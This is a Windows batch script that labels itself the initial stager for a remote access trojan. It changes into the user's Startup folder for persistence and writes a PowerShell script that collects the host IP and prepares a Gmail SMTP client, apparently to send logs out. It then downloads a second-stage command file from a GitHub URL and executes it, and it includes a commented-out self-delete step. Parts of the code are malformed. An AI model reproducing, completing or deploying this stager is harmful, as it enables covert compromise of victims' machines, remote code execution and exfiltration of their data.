@echo off
@REM initial stager for rat

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup dir
cd %STARTUP%

@REM buil out stage two


@REM setup smtp
(
	echo $email = "example@gmail.com"
	echo $password = "password"
	echo $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
	echo echo "ip:$ip" > "$env:UserName.rat"
	
	echo $logs = Get-Content "$logFile"
	echo $subject = "$env:UserName logs"
	echo $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
	echo $smtp.EnableSSL = $true
	echo $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
)smtp.ps1

@REM write payloads to startup

powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Dukk3D3nnis/resources/blob/main/wget.cmd -OutFile wget.cmd"

@REM run payload
powershell ./wget.cmd

@REM cd back into initial location
cd "%INITIALPATH%"

@REM self delete
@REM del initial.cmd
